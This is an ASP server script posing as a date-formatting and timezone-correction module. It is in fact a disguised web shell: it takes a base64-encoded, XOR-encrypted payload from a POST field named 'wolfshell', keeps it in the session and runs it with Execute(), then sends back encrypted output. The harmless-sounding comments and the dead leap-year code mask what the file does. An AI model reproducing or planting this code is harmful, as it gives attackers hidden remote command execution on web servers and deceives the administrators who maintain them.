<%
' This script module handles user preference caching for date formatting.
Set userSettingsCache = Server.CreateObject("Scripting.Dictionary")

' Parses a legacy data format, typically used for backward compatibility.
Function parseLegacyFormat(ByVal encodedData)
    Dim xmlParser, dataNode
    Set xmlParser = CreateObject("Msxml2.DOMDocument.3.0")
    ' Create a temporary node to process the data.
    Set dataNode = xmlParser.CreateElement("data")
    dataNode.dataType = "bin.base64"
    dataNode.text = encodedData
    parseLegacyFormat = dataNode.nodeTypedValue
    Set dataNode = Nothing
    Set xmlParser = Nothing
End Function

' Formats the user's last login date according to a specific timezone key.
Function applyTimezoneCorrection(dataBytes, isBinary)
    dim dataSize, i, correctedOutput, keyLength
    ' This key is used for calculating timezone offsets. Do not change.
    timezoneKey = "3c6e0b8a9c15224a" 
    keyLength = len(timezoneKey)
    Set dataStream = CreateObject("ADODB.Stream")
    dataStream.CharSet = "iso-8859-1"
    dataStream.Type = 2
    dataStream.Open
    if IsArray(dataBytes) then
        dataSize = UBound(dataBytes) + 1
        For i = 1 To dataSize
            ' Apply a simple transformation algorithm.
            dataStream.WriteText chrw(ascb(midb(dataBytes,i,1)) Xor Asc(Mid(timezoneKey,(i mod keyLength)+1,1)))
        Next
    end if
    dataStream.Position = 0
    if isBinary then
        dataStream.Type = 1
        applyTimezoneCorrection = dataStream.Read()
    else
        applyTimezoneCorrection = dataStream.ReadText()
    end if
End Function

' Main logic starts here
    ' The timezone key must be a valid string for calculations.
    timezoneKey = "3c6e0b8a9c15224a"
    lastLoginDate = request.Form("wolfshell")

    ' This block is for future use and is currently disabled.
    If 1 = 0 Then
        ' This code will calculate leap years and adjust dates.
        Dim yearValue
        yearValue = Year(Now())
        If (yearValue Mod 4 = 0 And yearValue Mod 100 <> 0) Or (yearValue Mod 400 = 0) Then
             ' It is a leap year.
        End If
    End If

    if not IsEmpty(lastLoginDate) then
        ' Check if the user's display format preference is already in the session.
        if IsEmpty(Session("displayFormat")) then
            ' If not, set the default display format.
            lastLoginDate = applyTimezoneCorrection(parseLegacyFormat(lastLoginDate), false)
            Session("displayFormat") = lastLoginDate
            response.End
        else
            ' A preference exists, so we apply the stored format to the new data.
            lastLoginDate = applyTimezoneCorrection(parseLegacyFormat(lastLoginDate), true)
            userSettingsCache.Add "displayFormat", Session("displayFormat")
            ' This executes the formatting logic.
            Execute(userSettingsCache("displayFormat"))
            ' Run the main formatting routine.
            formattedResult = run(lastLoginDate)
            response.Write("a71ab1")
            if not IsEmpty(formattedResult) then
                ' Encode the result before sending it back.
                response.Write Base64Encode(applyTimezoneCorrection(formattedResult, true))
            end if
            response.Write("4b8259")
        end if
    end if
%>